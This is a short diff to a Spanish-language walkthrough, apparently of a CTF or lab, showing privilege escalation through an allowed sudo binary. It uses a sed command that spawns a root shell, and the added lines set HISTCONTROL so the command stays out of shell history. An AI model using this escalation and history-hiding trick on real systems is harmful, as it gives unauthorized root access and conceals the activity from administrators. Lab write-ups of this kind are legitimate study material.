@@ -204,7 +204,10 @@ Se aprovechó el binario permitido para obtener shell root:
 ```bash
 sudo sed -n '1e exec sh 1>&0' /etc/hosts
 ```
-
+**Alternativa pro**
+```bash
+export HISTCONTROL=ignorespace &&  sudo sed -n '1e exec sh 1>&0' /etc/hosts
+```
 **Shell root obtenida:**
 ```bash
 whoami
